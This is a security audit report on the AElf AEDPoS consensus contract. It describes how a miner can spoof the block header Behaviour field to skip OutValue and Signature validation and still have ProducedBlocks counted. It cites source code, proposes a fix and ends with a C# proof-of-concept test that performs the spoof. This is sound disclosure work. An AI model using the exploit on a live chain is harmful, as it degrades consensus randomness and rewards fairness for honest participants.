# Audit Report

## Title
Consensus Behavior Spoofing Enables Bypass of UpdateValue Validation Requirements

## Summary
The AEDPoS consensus validation logic blindly trusts the `Behaviour` field in block headers without verifying it matches the expected behavior determined by consensus state. A malicious miner can claim `TinyBlock` behavior when they should provide `UpdateValue`, bypassing OutValue and Signature validation requirements, thereby evading cryptographic consensus commitments while still receiving block rewards.

## Finding Description

The vulnerability exists because the validation flow trusts the miner-supplied `Behaviour` field without cross-checking it against what the consensus rules mandate.

**Expected Behavior Determination:**
When a miner has `OutValue == null` and their time slot hasn't passed, `GetConsensusBehaviour()` returns `UpdateValue` behavior, requiring the miner to provide cryptographic commitments. [1](#0-0) [2](#0-1) 

**Validation Bypass:**
However, `ValidateBeforeExecution` uses `extraData.Behaviour` directly from the block header to determine which recovery method to use and which validation providers to apply, without verifying this matches the expected behavior. [3](#0-2) 

**Differential Recovery:**
The system uses different recovery methods based on the claimed behavior. `RecoverFromUpdateValue` restores OutValue, Signature, PreviousInValue, and other critical fields, while `RecoverFromTinyBlock` only restores ImpliedIrreversibleBlockHeight and ActualMiningTimes, omitting OutValue and Signature. [4](#0-3) [5](#0-4) 

**Validation Provider Selection:**
The `UpdateValueValidationProvider`, which validates OutValue and Signature presence, is ONLY added when `extraData.Behaviour == UpdateValue`. For TinyBlock behavior, this critical validator is skipped. [6](#0-5) [7](#0-6) 

**Transaction Routing:**
Transaction generation uses the claimed behavior to decide which method to call - `UpdateValue` versus `UpdateTinyBlockInformation`. [8](#0-7) 

**State Update Divergence:**
`ProcessUpdateValue` updates OutValue, Signature, PreviousInValue, and ProducedBlocks, while `ProcessTinyBlock` only updates ActualMiningTimes and ProducedBlocks, NOT OutValue or Signature. [9](#0-8) [10](#0-9) 

**Attack Path:**
A malicious miner whose OutValue is null (should use UpdateValue) modifies their node to set `Behaviour = TinyBlock` in block headers. During validation, other nodes call `RecoverFromTinyBlock` and skip the `UpdateValueValidationProvider`, allowing the block to pass validation. The resulting `UpdateTinyBlockInformation` transaction increments ProducedBlocks but leaves OutValue and Signature null, violating consensus obligations while claiming rewards.

## Impact Explanation

**Consensus Integrity Compromise:**
- The random number generation chain breaks as miners can skip providing OutValue, which is computed as the hash of their InValue and forms the basis for secure randomness in AEDPoS
- Signature-based accountability is eliminated since miners avoid publishing signatures that commit them to their consensus participation  
- The secret sharing mechanism for random number generation degrades as fewer miners contribute their cryptographic commitments

**Protocol Fairness Violation:**
- Miners receive block production rewards (ProducedBlocks counter incremented) without fulfilling the complete consensus obligations required by the UpdateValue behavior
- This creates an asymmetric advantage for malicious miners who avoid cryptographic overhead while honest miners bear the full computational cost
- The consensus mechanism's security guarantees weaken proportionally to the number of miners exploiting this bypass

**Affected Parties:**
- All network participants relying on the security properties of AEDPoS consensus
- Applications depending on the quality of on-chain random numbers
- Honest miners who properly fulfill UpdateValue requirements face unfair competition

The severity is Medium because while this doesn't enable direct fund theft, it fundamentally undermines consensus integrity and enables selective protocol violation that degrades the security foundation of the entire chain.

## Likelihood Explanation

**Attacker Prerequisites:**
- Must control a block producer node (requires becoming a miner through normal election mechanisms, achievable with sufficient staked tokens and votes)
- Needs full control over their node software to modify block header generation logic
- Must be in their assigned time slot when OutValue is null (occurs naturally on their first block in each round)

**Attack Complexity:**
The attack is technically straightforward - simply modify the node's block production logic to set `Behaviour = TinyBlock` instead of the correct `UpdateValue` when generating the `AElfConsensusHeaderInformation`. The behavior field is set directly from the trigger information parameter. [11](#0-10) 

No complex cryptographic operations, state manipulation, or timing windows are required beyond normal block production.

**Detection Constraints:**
- The attack is observable by monitoring round state - other nodes can see that a miner's OutValue remains null after producing blocks
- However, there is no automatic validation or penalty mechanism in the validation code to reject such blocks or punish the offending miner
- Detection requires manual monitoring and governance intervention, which may be slow or ineffective

**Feasibility Assessment:**
Medium likelihood - technically simple for any miner to execute with modified node software, but carries reputational risk if detected. The lack of automated prevention makes exploitation practical, though the visibility of missing OutValue fields in state provides some deterrent.

## Recommendation

Add validation in `ValidateBeforeExecution` to verify that `extraData.Behaviour` matches the expected behavior determined by consensus state:

```csharp
// After line 20 in AEDPoSContract_Validation.cs, add:
var expectedBehaviour = IsMainChain
    ? new MainChainConsensusBehaviourProvider(baseRound, extraData.SenderPubkey.ToHex(),
        GetMaximumBlocksCount(), Context.CurrentBlockTime, GetBlockchainStartTimestamp(), 
        State.PeriodSeconds.Value).GetConsensusBehaviour()
    : new SideChainConsensusBehaviourProvider(baseRound, extraData.SenderPubkey.ToHex(),
        GetMaximumBlocksCount(), Context.CurrentBlockTime).GetConsensusBehaviour();

if (extraData.Behaviour != expectedBehaviour)
{
    return new ValidationResult 
    { 
        Success = false, 
        Message = $"Claimed behaviour {extraData.Behaviour} does not match expected behaviour {expectedBehaviour}." 
    };
}
```

This ensures that miners cannot spoof their consensus behavior to bypass validation requirements.

## Proof of Concept

```csharp
[Fact]
public async Task ConsensusBehaviorSpoofing_BypassesUpdateValueValidation()
{
    // Setup: First miner produces first block normally
    await AEDPoSContract_FirstRound_BootMiner_Test();
    
    // Attack: Second miner should use UpdateValue (OutValue is null)
    // but claims TinyBlock behavior instead
    var attackerKeyPair = InitialCoreDataCenterKeyPairs[1];
    KeyPairProvider.SetKeyPair(attackerKeyPair);
    
    BlockTimeProvider.SetBlockTime(BlockchainStartTimestamp + new Duration
    {
        Seconds = AEDPoSContractTestConstants.MiningInterval.Div(1000)
    });
    
    // Get consensus command (would correctly return UpdateValue)
    var triggerForCommand = TriggerInformationProvider
        .GetTriggerInformationForConsensusCommand(new BytesValue());
    var consensusCommand = await AEDPoSContractStub.GetConsensusCommand.CallAsync(triggerForCommand);
    
    // Attacker modifies trigger to claim TinyBlock behavior
    var maliciousTrigger = new AElfConsensusTriggerInformation
    {
        Pubkey = attackerKeyPair.PublicKey.ToByteString(),
        Behaviour = AElfConsensusBehaviour.TinyBlock, // SPOOFED - should be UpdateValue
        RandomNumber = ByteString.CopyFrom(await GenerateRandomProofAsync(attackerKeyPair))
    };
    
    // Generate extra data with spoofed behavior
    var extraDataBytes = await AEDPoSContractStub.GetConsensusExtraData
        .CallAsync(maliciousTrigger.ToBytesValue());
    
    // Validate - should fail but PASSES due to missing behavior verification
    var validationResult = await AEDPoSContractStub.ValidateConsensusBeforeExecution
        .CallAsync(extraDataBytes);
    
    validationResult.Success.ShouldBeTrue(); // VULNERABILITY: Passes when it should fail
    
    // Generate and execute malicious transaction
    var transactionList = await AEDPoSContractStub.GenerateConsensusTransactions
        .CallAsync(maliciousTrigger.ToBytesValue());
    
    // Should generate UpdateTinyBlockInformation instead of UpdateValue
    transactionList.Transactions[0].MethodName.ShouldBe(nameof(AEDPoSContractStub.UpdateTinyBlockInformation));
    
    // Execute the transaction
    var tinyBlockInput = new TinyBlockInput();
    tinyBlockInput.MergeFrom(transactionList.Transactions[0].Params);
    await AEDPoSContractStub.UpdateTinyBlockInformation.SendAsync(tinyBlockInput);
    
    // Verify the attack succeeded: ProducedBlocks incremented but OutValue still null
    var currentRound = await AEDPoSContractStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var attackerInfo = currentRound.RealTimeMinersInformation[attackerKeyPair.PublicKey.ToHex()];
    
    attackerInfo.ProducedBlocks.ShouldBe(1); // Got reward
    attackerInfo.OutValue.ShouldBeNull(); // But didn't provide OutValue (VULNERABILITY)
    attackerInfo.Signature.ShouldBeNull(); // And didn't provide Signature (VULNERABILITY)
}
```

## Notes

The vulnerability is confirmed through code analysis. The validation framework has no mechanism to verify that the claimed `Behaviour` in block headers matches what `GetConsensusBehaviour()` would determine based on consensus state. This allows miners to selectively bypass cryptographic obligations while still receiving block rewards, undermining the security guarantees of the AEDPoS consensus mechanism.

### Citations

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusCommandGeneration/ConsensusBehaviourProviderBase.cs (L48-56)
```csharp
            // If out value is null, it means provided pubkey hasn't mine any block during current round period.
            if (_minerInRound.OutValue == null)
            {
                var behaviour = HandleMinerInNewRound();

                // It's possible HandleMinerInNewRound can't handle all the situations, if this method returns Nothing,
                // just go ahead. Otherwise, return it's result.
                if (behaviour != AElfConsensusBehaviour.Nothing) return behaviour;
            }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusCommandGeneration/ConsensusBehaviourProviderBase.cs (L114-114)
```csharp
            return !_isTimeSlotPassed ? AElfConsensusBehaviour.UpdateValue : AElfConsensusBehaviour.Nothing;
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L46-50)
```csharp
        if (extraData.Behaviour == AElfConsensusBehaviour.UpdateValue)
            baseRound.RecoverFromUpdateValue(extraData.Round, extraData.SenderPubkey.ToHex());

        if (extraData.Behaviour == AElfConsensusBehaviour.TinyBlock)
            baseRound.RecoverFromTinyBlock(extraData.Round, extraData.SenderPubkey.ToHex());
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_Validation.cs (L77-92)
```csharp
        switch (extraData.Behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                validationProviders.Add(new UpdateValueValidationProvider());
                // Is confirmed lib height and lib round number went down? (Which should not happens.)
                validationProviders.Add(new LibInformationValidationProvider());
                break;
            case AElfConsensusBehaviour.NextRound:
                // Is sender's order of next round correct?
                validationProviders.Add(new NextRoundMiningOrderValidationProvider());
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
            case AElfConsensusBehaviour.NextTerm:
                validationProviders.Add(new RoundTerminateValidationProvider());
                break;
        }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L8-33)
```csharp
    public Round RecoverFromUpdateValue(Round providedRound, string pubkey)
    {
        if (!RealTimeMinersInformation.ContainsKey(pubkey) ||
            !providedRound.RealTimeMinersInformation.ContainsKey(pubkey))
            return this;

        var minerInRound = RealTimeMinersInformation[pubkey];
        var providedInformation = providedRound.RealTimeMinersInformation[pubkey];
        minerInRound.OutValue = providedInformation.OutValue;
        minerInRound.Signature = providedInformation.Signature;
        minerInRound.PreviousInValue = providedInformation.PreviousInValue;
        minerInRound.ImpliedIrreversibleBlockHeight = providedInformation.ImpliedIrreversibleBlockHeight;
        minerInRound.ActualMiningTimes.Add(providedInformation.ActualMiningTimes);

        foreach (var information in providedRound.RealTimeMinersInformation)
        {
            RealTimeMinersInformation[information.Key].SupposedOrderOfNextRound =
                information.Value.SupposedOrderOfNextRound;
            RealTimeMinersInformation[information.Key].FinalOrderOfNextRound =
                information.Value.FinalOrderOfNextRound;
            RealTimeMinersInformation[information.Key].PreviousInValue =
                information.Value.PreviousInValue;
        }

        return this;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round_Recover.cs (L35-47)
```csharp
    public Round RecoverFromTinyBlock(Round providedRound, string pubkey)
    {
        if (!RealTimeMinersInformation.ContainsKey(pubkey) ||
            !providedRound.RealTimeMinersInformation.ContainsKey(pubkey))
            return this;

        var minerInRound = RealTimeMinersInformation[pubkey];
        var providedInformation = providedRound.RealTimeMinersInformation[pubkey];
        minerInRound.ImpliedIrreversibleBlockHeight = providedInformation.ImpliedIrreversibleBlockHeight;
        minerInRound.ActualMiningTimes.Add(providedInformation.ActualMiningTimes);

        return this;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/UpdateValueValidationProvider.cs (L27-33)
```csharp
    private bool NewConsensusInformationFilled(ConsensusValidationContext validationContext)
    {
        var minerInRound =
            validationContext.ProvidedRound.RealTimeMinersInformation[validationContext.SenderPubkey];
        return minerInRound.OutValue != null && minerInRound.Signature != null &&
               minerInRound.OutValue.Value.Any() && minerInRound.Signature.Value.Any();
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ACS4_ConsensusInformationProvider.cs (L135-163)
```csharp
        switch (behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                Context.LogDebug(() =>
                    $"Previous in value in extra data:{round.RealTimeMinersInformation[pubkey.ToHex()].PreviousInValue}");
                return new TransactionList
                {
                    Transactions =
                    {
                        GenerateTransaction(nameof(UpdateValue),
                            round.ExtractInformationToUpdateConsensus(pubkey.ToHex(), randomNumber))
                    }
                };
            case AElfConsensusBehaviour.TinyBlock:
                var minerInRound = round.RealTimeMinersInformation[pubkey.ToHex()];
                return new TransactionList
                {
                    Transactions =
                    {
                        GenerateTransaction(nameof(UpdateTinyBlockInformation),
                            new TinyBlockInput
                            {
                                ActualMiningTime = minerInRound.ActualMiningTimes.Last(),
                                ProducedBlocks = minerInRound.ProducedBlocks,
                                RoundId = round.RoundIdForValidation,
                                RandomNumber = randomNumber
                            })
                    }
                };
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L238-252)
```csharp
    private void ProcessUpdateValue(UpdateValueInput updateValueInput)
    {
        TryToGetCurrentRoundInformation(out var currentRound);

        var minerInRound = currentRound.RealTimeMinersInformation[_processingBlockMinerPubkey];
        minerInRound.ActualMiningTimes.Add(updateValueInput.ActualMiningTime);
        minerInRound.Signature = updateValueInput.Signature;
        minerInRound.OutValue = updateValueInput.OutValue;
        minerInRound.SupposedOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.FinalOrderOfNextRound = updateValueInput.SupposedOrderOfNextRound;
        minerInRound.ImpliedIrreversibleBlockHeight = updateValueInput.ImpliedIrreversibleBlockHeight;

        // Just add 1 based on previous data, do not use provided values.
        minerInRound.ProducedBlocks = minerInRound.ProducedBlocks.Add(1);
        minerInRound.ProducedTinyBlocks = minerInRound.ProducedTinyBlocks.Add(1);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L299-309)
```csharp
    private void ProcessTinyBlock(TinyBlockInput tinyBlockInput)
    {
        TryToGetCurrentRoundInformation(out var currentRound);

        var minerInRound = currentRound.RealTimeMinersInformation[_processingBlockMinerPubkey];
        minerInRound.ActualMiningTimes.Add(tinyBlockInput.ActualMiningTime);
        minerInRound.ProducedBlocks = minerInRound.ProducedBlocks.Add(1);
        minerInRound.ProducedTinyBlocks = minerInRound.ProducedTinyBlocks.Add(1);

        Assert(TryToUpdateRoundInformation(currentRound), "Failed to update round information.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_GetConsensusBlockExtraData.cs (L26-48)
```csharp
        switch (triggerInformation.Behaviour)
        {
            case AElfConsensusBehaviour.UpdateValue:
                information = GetConsensusExtraDataToPublishOutValue(currentRound, pubkey,
                    triggerInformation);
                if (!isGeneratingTransactions) information.Round = information.Round.GetUpdateValueRound(pubkey);

                break;

            case AElfConsensusBehaviour.TinyBlock:
                information = GetConsensusExtraDataForTinyBlock(currentRound, pubkey,
                    triggerInformation);
                break;

            case AElfConsensusBehaviour.NextRound:
                information = GetConsensusExtraDataForNextRound(currentRound, pubkey,
                    triggerInformation);
                break;

            case AElfConsensusBehaviour.NextTerm:
                information = GetConsensusExtraDataForNextTerm(pubkey, triggerInformation);
                break;
        }
```
